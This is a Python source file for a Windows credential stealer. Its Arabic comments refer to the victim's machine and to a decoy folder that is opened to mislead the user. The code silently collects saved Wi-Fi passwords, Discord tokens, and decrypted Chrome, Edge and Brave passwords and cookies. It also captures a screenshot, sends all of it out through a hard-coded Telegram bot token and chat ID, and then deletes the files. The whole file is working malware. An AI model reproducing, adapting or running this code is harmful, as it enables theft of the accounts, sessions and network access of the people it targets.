import os
import sys
import json
import base64
import sqlite3
import shutil
import subprocess
import requests
import ctypes
import re
import time
from PIL import ImageGrab
import win32clipboard

# المكتبات الحساسة لفك التشفير
try:
    from win32 import win32crypt
    from Cryptodome.Cipher import AES
except ImportError:
    pass

# إعدادات الصمت التام لضمان عدم ظهور أي نوافذ على جهاز الضحية
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0

BOT_TOKEN = "8253181046:AAGwhrXiZU02eCt54pAGwpKuxTkJ7t4YRRI"
CHAT_ID = 6012820754


def send_to_telegram(file_path, is_photo=False):
    method = "sendPhoto" if is_photo else "sendDocument"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                payload = {"chat_id": CHAT_ID, "disable_notification": True}
                files = {"photo" if is_photo else "document": file}
                requests.post(url, data=payload, files=files, timeout=30)
    except:
        pass


def get_screenshot():
    try:
        ss_path = "screen.png"
        screenshot = ImageGrab.grab()
        screenshot.save(ss_path)
        # إخفاء الصورة فوراً برمجياً
        ctypes.windll.kernel32.SetFileAttributesW(ss_path, 2)
        return ss_path
    except:
        return None


def get_wifi_passwords():
    results = "\n--- Wi-Fi Passwords ---\n"
    try:
        data = (
            subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"], startupinfo=si
            )
            .decode("utf-8", errors="ignore")
            .split("\n")
        )
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            wifi_data = (
                subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", i, "key=clear"], startupinfo=si
                )
                .decode("utf-8", errors="ignore")
                .split("\n")
            )
            password = [b.split(":")[1][1:-1] for b in wifi_data if "Key Content" in b]
            results += f"SSID: {i} | Password: {password[0] if password else 'None'}\n"
    except:
        pass
    return results


def get_encryption_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
    except:
        return None


def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        return ""


def get_discord_tokens():
    results = "\n--- Discord Tokens ---\n"
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    }
    for platform, path in paths.items():
        path = os.path.join(path, "Local Storage\\leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                try:
                    with open(f"{path}\\{file_name}", errors="ignore") as f:
                        for line in f:
                            for token in re.findall(
                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}",
                                line.strip(),
                            ):
                                results += f"[{platform}] Token: {token}\n"
                except:
                    pass
    return results


def get_browser_data():
    results = "\n--- Passwords & Cookies ---\n"
    user_data = os.environ["USERPROFILE"]
    important_sites = [
        "facebook",
        "instagram",
        "tiktok",
        "google",
        "github",
        "discord",
        "epicgames",
    ]

    browsers = {
        "Chrome": os.path.join(user_data, "AppData\\Local\\Google\\Chrome\\User Data"),
        "Edge": os.path.join(user_data, "AppData\\Local\\Microsoft\\Edge\\User Data"),
        "Brave": os.path.join(
            user_data, "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"
        ),
    }

    for name, path in browsers.items():
        local_state = os.path.join(path, "Local State")
        key = get_encryption_key(local_state)
        if not key:
            continue
        for i in range(3):
            profile = "Default" if i == 0 else f"Profile {i}"
            login_db = os.path.join(path, profile, "Login Data")
            if os.path.exists(login_db):
                tmp_db = f"lp_{name[0]}_{i}.db"
                try:
                    shutil.copyfile(login_db, tmp_db)
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"
                    )
                    for row in cursor.fetchall():
                        p = decrypt_data(row[2], key)
                        if p:
                            results += f"[PASS][{name}] URL: {row[0]} | User: {row[1]} | Pass: {p}\n"
                    conn.close()
                    os.remove(tmp_db)
                except:
                    pass

            cookie_db = os.path.join(path, profile, "Network", "Cookies")
            if os.path.exists(cookie_db):
                tmp_c = f"ck_{name[0]}_{i}.db"
                try:
                    shutil.copyfile(cookie_db, tmp_c)
                    conn = sqlite3.connect(tmp_c)
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT host_key, name, encrypted_value FROM cookies"
                    )
                    for row in cursor.fetchall():
                        if any(site in row[0] for site in important_sites):
                            c = decrypt_data(row[2], key)
                            if c:
                                results += f"[COOKIE][{name}] Site: {row[0]} | Name: {row[1]} | Val: {c}\n"
                    conn.close()
                    os.remove(tmp_c)
                except:
                    pass
    return results


if __name__ == "__main__":
    try:
        # 1. فتح الفولدر التمويهي
        if os.path.exists("very  Important"):
            os.startfile("very  Important")

        # 4. جمع البيانات النصية بما فيها الـ Clipboard المطور
        final_report = get_wifi_passwords() + get_discord_tokens() + get_browser_data()

        # 5. إنشاء ملف التقرير مخفياً من اللحظة الأولى
        text_file = "system_info.txt"
        with open(text_file, "w", encoding="utf-8") as f:
            f.write(final_report)

        ctypes.windll.kernel32.SetFileAttributesW(text_file, 2)

        # 6. الإرسال النهائي والمسح الشامل
        send_to_telegram(text_file)
        if os.path.exists(text_file):
            os.remove(text_file)

        # 3. التقاط الصورة وإخفاؤها وإرسالها
        pic_file = get_screenshot()
        if pic_file:
            send_to_telegram(pic_file, is_photo=True)
            os.remove(pic_file)
    except:
        pass
    os._exit(0)
